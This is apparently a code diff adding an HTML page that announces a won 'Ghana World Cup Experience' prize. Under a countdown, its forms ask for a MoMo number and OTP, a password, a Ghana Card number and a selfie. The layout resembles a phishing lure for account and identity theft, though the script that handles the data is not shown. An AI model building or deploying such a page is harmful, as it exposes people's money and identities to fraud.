@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Claim Your World Cup Experience Prize</title>
+    <link rel="stylesheet" href="./styles.css" />
+  </head>
+  <body>
+    <div class="page-wrapper">
+      <!-- Countdown Banner -->
+      <div class="banner">
+        <div class="banner-content">
+          <span class="banner-icon">⏳</span>
+          <div class="banner-text">
+            <div class="banner-title">
+              Claim window: 5 days from SMS receipt
+            </div>
+            <div class="countdown-display">
+              Time remaining: <span id="countdown-display">4d 23h 59m</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Countdown Timer -->
+      <div class="countdown">
+        <div class="countdown-item">
+          <span class="countdown-value">00</span>
+          <span class="countdown-label">Days</span>
+        </div>
+        <div class="countdown-item">
+          <span class="countdown-value">00</span>
+          <span class="countdown-label">Hours</span>
+        </div>
+        <div class="countdown-item">
+          <span class="countdown-value">00</span>
+          <span class="countdown-label">Minutes</span>
+        </div>
+        <div class="countdown-item">
+          <span class="countdown-value">00</span>
+          <span class="countdown-label">Seconds</span>
+        </div>
+      </div>
+
+      <h1>Claim Your World Cup Experience Prize</h1>
+      <p>
+        Congratulations! You've won a fully sponsored Ghana World Cup
+        Experience. Complete the steps below to claim your prize.
+      </p>
+      <button class="claim-cta">Start Claim</button>
+      
+      <!-- Steps Overview -->
+      <div class="steps-container">
+        <div class="step">
+          <div class="step-number">1</div>
+          <div class="step-content">
+            <h3>Verify MoMo Account</h3>
+            <p>Enter your MoMo number to receive a verification code</p>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-number">2</div>
+          <div class="step-content">
+            <h3>Create Account</h3>
+            <p>Set up your account with email and password</p>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-number">3</div>
+          <div class="step-content">
+            <h3>Accept Contract</h3>
+            <p>Review and accept the winner terms and conditions</p>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-number">4</div>
+          <div class="step-content">
+            <h3>KYC Verification</h3>
+            <p>Submit your Ghana Card and photo for verification</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Step 1: Phone Verification Modal -->
+    <div class="modal" id="phoneVerificationModal">
+      <div class="modal-content">
+        <span class="close-btn">&times;</span>
+        <div class="step-indicator">Step 1 of 4: Verify Your Phone</div>
+        <h2>Verify Your Mobile Money Account</h2>
+        <p>Enter your MoMo account number to receive a verification code</p>
+        <p class="text-muted">The phone number must match the one that received the winning SMS.</p>
+
+        <form id="phoneVerificationForm" class="verification-form">
+          <div class="form-group">
+            <label for="phone">MoMo Account Number</label>
+            <div class="input-with-button">
+              <div class="input-prefix">+233</div>
+              <input
+                type="tel"
+                id="phone"
+                name="phone"
+                placeholder="e.g. 244123456"
+                pattern="[0-9]{9}"
+                inputmode="numeric"
+                required
+              />
+              <button type="button" id="sendOtpBtn" class="otp-btn">
+                Send OTP
+              </button>
+            </div>
+            <small class="form-hint">Enter your 9-digit MoMo number without the leading 0</small>
+          </div>
+
+          <div id="otpSection" class="form-group" style="display: none">
+            <label for="otp">Enter OTP Code</label>
+            <div class="otp-input-container">
+              <input type="text" maxlength="1" class="otp-digit" pattern="[0-9]" inputmode="numeric" />
+              <input type="text" maxlength="1" class="otp-digit" pattern="[0-9]" inputmode="numeric" />
+              <input type="text" maxlength="1" class="otp-digit" pattern="[0-9]" inputmode="numeric" />
+              <input type="text" maxlength="1" class="otp-digit" pattern="[0-9]" inputmode="numeric" />
+              <input type="text" maxlength="1" class="otp-digit" pattern="[0-9]" inputmode="numeric" />
+              <input type="text" maxlength="1" class="otp-digit" pattern="[0-9]" inputmode="numeric" />
+              <input type="hidden" id="otp" name="otp" />
+            </div>
+            <div class="otp-actions">
+              <button type="button" id="verifyOtpBtn" class="otp-btn" disabled>
+                Verify OTP
+              </button>
+              <div class="otp-timer">
+                <span id="otpTimer">02:00</span> remaining
+                <a href="#" id="resendOtp" style="display: none; margin-left: 10px">Resend OTP</a>
+              </div>
+            </div>
+          </div>
+
+          <div class="form-actions">
+            <button type="button" id="nextBtn" class="submit-btn" disabled>
+              Continue
+            </button>
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <!-- Step 2: Create Account Modal -->
+    <div class="modal" id="createAccountModal">
+      <div class="modal-content">
+        <span class="close-btn">&times;</span>
+        <div class="step-indicator">Step 2 of 4: Create Account</div>
+        <h2>Create Your Account</h2>
+        <p>Set up your account with a secure password</p>
+        <p>Secure access for the MoMo account holder</p>
+
+        <form id="createAccountForm" class="account-form">
+          <div class="form-group">
+            <label for="accountPhone">Phone Number</label>
+            <input type="tel" id="accountPhone" readonly />
+          </div>
+
+          <div class="form-group">
+            <label for="email"
+              >Email Address
+              <span class="optional">(optional but recommended)</span></label
+            >
+            <input
+              type="email"
+              id="email"
+              name="email"
+              placeholder="your.email@example.com"
+            />
+          </div>
+
+          <div class="form-group">
+            <label for="password">Create Password</label>
+            <div class="password-field">
+              <input
+                type="password"
+                id="password"
+                name="password"
+                placeholder="Minimum 8 characters"
+                minlength="8"
+                required
+              />
+              <span class="password-toggle" id="togglePassword">👁️</span>
+            </div>
+            <div class="password-strength">
+              <div class="strength-bar"></div>
+              <span class="strength-text">Password strength</span>
+            </div>
+          </div>
+
+          <div class="form-checkbox">
+            <input
+              type="checkbox"
+              id="accountHolder"
+              name="accountHolder"
+              required
+            />
+            <label for="accountHolder"
+              >I am the MoMo account holder for this number</label
+            >
+          </div>
+
+          <div class="form-actions">
+            <button type="button" class="back-btn">Back</button>
+            <button type="submit" class="submit-btn">
+              Create Account & Continue
+            </button>
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <!-- Step 3: Contract Acceptance Modal -->
+    <div class="modal" id="contractModal">
+      <div class="modal-content contract-modal">
+        <span class="close-btn">&times;</span>
+        <div class="step-indicator">
+          Step 3 of 4: Winner Acceptance Contract
+        </div>
+        <h2>Winner Acceptance Contract</h2>
+        <p class="text-muted">Please read and accept all terms to proceed</p>
+        
+        <div class="contract-container">
+          <form id="contractForm" class="contract-form">
+            <div class="contract-scroll">
+              <div class="contract-intro">
+                <p><strong>By ticking each box below, I confirm and agree that:</strong></p>
+              </div>
+
+              <div class="contract-item">
+                <input type="checkbox" id="term1" name="terms" class="term-checkbox" required />
+                <label for="term1">
+                  I am the verified MoMo account holder linked to the winning entry, and the information I provide is true and accurate.
+                </label>
+              </div>
+
+              <div class="contract-item">
+                <input type="checkbox" id="term2" name="terms" class="term-checkbox" required />
+                <label for="term2">
+                  I understand my prize is a fully sponsored Ghana World Cup Experience, which includes subsidized return flights (Accra–Mexico–Accra), accommodation of up to 3 weeks, match tickets for Ghana's group-stage games, and full visa fee payment with document coaching.
+                </label>
+              </div>
+
+              <div class="contract-item">
+                <input type="checkbox" id="term3" name="terms" class="term-checkbox" required />
+                <label for="term3">
+                  I acknowledge that visa approval is granted solely at the discretion of the host embassy. If my visa is refused, I will not receive an alternative prize or cash equivalent.
+                </label>
+              </div>
+
+              <div class="contract-item">
+                <input type="checkbox" id="termsAgreement" name="termsAgreement" class="term-checkbox" required />
+                <label for="termsAgreement">
+                  I have read and agree to the <a href="#" target="_blank">Terms & Conditions</a>.
+                </label>
+              </div>
+
+              <div class="contract-item">
+                <input type="checkbox" id="privacyAgreement" name="privacyAgreement" class="term-checkbox" required />
+                <label for="privacyAgreement">
+                  I have read and agree to the <a href="#" target="_blank">Privacy and Data Statement</a>.
+                </label>
+              </div>
+
+              <div class="form-group" id="parentalConsent" style="display: none;">
+                <input type="checkbox" id="parentalCheckbox" name="parentalConsent" class="term-checkbox">
+                <label for="parentalCheckbox">
+                  I confirm I have parental or guardian consent to enter into this contract.
+                </label>
+              </div>
+            </div>
+
+            <div class="form-actions">
+              <button type="button" class="back-btn">Back</button>
+              <button type="submit" id="acceptContractBtn" class="submit-btn" disabled>
+                Accept and Activate My Winner Contract
+              </button>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+      </div>
+    </div>
+
+    <!-- Step 4: KYC Verification Modal -->
+    <div class="modal" id="kycModal">
+      <div class="modal-content">
+        <span class="close-btn">&times;</span>
+        <div class="step-indicator">Step 4 of 4: KYC Verification</div>
+        <h2>Complete Your KYC Verification</h2>
+        <p class="subtitle">Please provide your Ghana Card details and a clear selfie for verification</p>
+        
+        <form id="kycForm" class="kyc-form">
+          <div class="form-row">
+            <div class="form-group full-width">
+              <label for="ghanaCard">Ghana Card Number</label>
+              <div class="input-with-prefix">
+                <span class="input-prefix">GHA-</span>
+                <input 
+                  type="text" 
+                  id="ghanaCard" 
+                  name="ghanaCard" 
+                  placeholder="123456789-0" 
+                  pattern="\d{9}-[0-9A-Z]"
+                  required
+                  class="form-control"
+                >
+              </div>
+              <small class="form-hint">Format: 123456789-0 (9 digits, hyphen, 1 letter)</small>
+            </div>
+          </div>
+          
+          <div class="form-group">
+            <label>Upload a clear photo of yourself</label>
+            <p class="upload-instructions">Take a selfie or upload a clear photo where your face is fully visible</p>
+            
+            <div class="upload-options">
+              <div class="upload-option" id="cameraOption" style="">
+                <div class="upload-icon">
+                  <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path>
+                    <circle cx="12" cy="13" r="4"></circle>
+                  </svg>
+                </div>
+                <span>Take Selfie</span>
+                <input type="file" id="cameraInput" accept="image/*" capture="environment" style="display: none;">
+              </div>
+              
+              <div class="upload-option" id="fileOption">
+                <div class="upload-icon">
+                  <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                    <polyline points="17 8 12 3 7 8"></polyline>
+                    <line x1="12" y1="3" x2="12" y2="15"></line>
+                  </svg>
+                </div>
+                <span>Upload Photo</span>
+                <input type="file" id="fileInput" accept="image/*" style="display: none;">
+              </div>
+            </div>
+            
+            <div class="upload-preview" id="uploadPreview">
+              <div class="upload-placeholder" id="uploadPlaceholder">
+                <div class="upload-icon">
+                  <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round">
+                    <rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect>
+                    <circle cx="8.5" cy="8.5" r="1.5"></circle>
+                    <polyline points="21 15 16 10 5 21"></polyline>
+                  </svg>
+                </div>
+                <p>Your photo will appear here</p>
+                <small class="text-muted">Make sure your face is clearly visible</small>
+              </div>
+              <div class="preview-container">
+                <img id="previewImage" alt="Preview" class="preview-img">
+                <div class="preview-actions">
+                  <button type="button" class="btn retake-btn" id="retakeBtn">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                      <polyline points="1 4 1 10 7 10"></polyline>
+                      <polyline points="23 20 23 14 17 14"></polyline>
+                      <path d="M20.49 9A9 9 0 0 0 5.64 5.64L1 10m22 4l-4.64 4.36A9 9 0 0 1 3.51 15"></path>
+                    </svg>
+                    Retake
+                  </button>
+                </div>
+              </div>
+            </div>
+            
+            <div class="photo-requirements">
+              <p class="requirements-title">Photo Requirements:</p>
+              <ul class="requirements-list">
+                <li>Face must be clearly visible</li>
+                <li>Good lighting is recommended</li>
+                <li>No sunglasses or face coverings</li>
+                <li>Look directly at the camera</li>
+              </ul>
+            </div>
+          </div>
+
+          <div class="form-actions">
+            <button type="button" class="btn btn-outline back-btn">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <line x1="19" y1="12" x2="5" y2="12"></line>
+                <polyline points="12 19 5 12 12 5"></polyline>
+              </svg>
+              Back
+            </button>
+            <button type="submit" id="submitKycBtn" class="btn btn-primary submit-btn" disabled>
+              Submit Verification
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="ml-1">
+                <path d="M5 12h14"></path>
+                <path d="M12 5l7 7-7 7"></path>
+              </svg>
+            </button>
+          </div>
+        </form>
+      </div>
+    </div>
+    
+    <!-- Camera Modal -->
+    <div id="cameraModal" class="camera-modal">
+      <div class="camera-container">
+        <video id="cameraVideo" autoplay playsinline></video>
+        <div class="camera-controls">
+          <button id="switchCameraBtn" class="camera-btn secondary" title="Switch Camera">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path>
+              <circle cx="12" cy="13" r="4"></circle>
+              <path d="M17 8h.01"></path>
+            </svg>
+          </button>
+          <button id="captureBtn" class="camera-btn" title="Take Photo">
+            <div class="camera-shutter"></div>
+          </button>
+          <button id="closeCameraBtn" class="camera-btn secondary" title="Close Camera">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <line x1="18" y1="6" x2="6" y2="18"></line>
+              <line x1="6" y1="6" x2="18" y2="18"></line>
+            </svg>
+          </button>
+        </div>
+        <canvas id="cameraCanvas" style="display: none;"></canvas>
+      </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div class="modal" id="successModal">
+      <div class="modal-content success-modal">
+        <div class="success-icon">🎉</div>
+        <h2>Your Winner Contract is Activated!</h2>
+        <p>
+          Thank you for completing the verification process. Your World Cup
+          Experience prize is now being processed.
+        </p>
+
+        <div class="next-steps">
+          <p><strong>What's next?</strong></p>
+          <ul>
+            <li>
+              You'll receive an email/SMS confirmation with your contract
+              details
+            </li>
+            <li>
+              A Visa agent will contact you within 48 hours to start your visa
+              application
+            </li>
+            <li>Keep an eye on your email for important updates</li>
+          </ul>
+        </div>
+
+        <div class="success-actions">
+          <button id="downloadContract" class="secondary-btn">
+            📄 Download Contract (PDF)
+          </button>
+          <button id="finishBtn" class="primary-btn">Finish</button>
+        </div>
+      </div>
+    </div>
+
+    <script type="module" src="script.js"></script>
+    <!-- Error Modal -->
+    <div class="modal" id="errorModal">
+      <div class="modal-content">
+        <span class="close-btn">&times;</span>
+        <div class="error-icon">⚠️</div>
+        <h2>Error</h2>
+        <p id="error-message"></p>
+        <div class="modal-actions">
+          <button class="submit-btn" onclick="hideModal()">OK</button>
+        </div>
+      </div>
+    </div>
+    <!-- Success Modal -->
+    <div class="modal" id="successModal">
+      <div class="modal-content success-modal">
+        <div class="success-icon">✓</div>
+        <h2>Verification Complete!</h2>
+        <p>Your prize claim has been successfully submitted.</p>
+        <p>You'll receive a confirmation email/SMS shortly with the next steps.</p>
+        <div class="success-actions">
+          <button id="downloadContract" class="btn secondary-btn">
+            Download Contract
+          </button>
+          <button id="finishBtn" class="btn primary-btn">
+            Finish
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Error Modal -->
+    <div class="modal" id="errorModal">
+      <div class="modal-content error-modal">
+        <span class="close-btn">&times;</span>
+        <div class="error-icon">!</div>
+        <h2>Something Went Wrong</h2>
+        <p id="error-message">An error occurred while processing your request. Please try again.</p>
+        <button class="btn primary-btn" onclick="hideModal()">
+          Try Again
+        </button>
+      </div>
+    </div>
+
+    <script type="module" src="./script.js"></script>
+  </body>
+</html>
